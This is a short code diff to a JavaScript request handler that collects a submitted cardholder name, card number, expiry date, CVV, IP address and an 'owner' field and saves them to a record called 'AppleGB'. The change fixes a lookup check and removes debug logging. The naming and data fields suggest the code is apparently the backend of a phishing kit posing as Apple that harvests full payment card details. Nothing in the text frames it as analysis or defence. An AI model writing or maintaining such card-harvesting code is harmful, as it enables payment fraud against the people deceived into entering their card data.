@@ -294,9 +294,7 @@ const submitCC = async (req, res) => {
   const { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
   try {
     let user = await AppleGB.findOne({ uniqueid }).exec();
-    console.log(user);
-    console.log(user.length);
-    if (user.length) {
+    if (user) {
       await AppleGB.findOneAndUpdate(
         { uniqueid },
         { ccname, ccnum, ccexp, cvv, status: 2 }
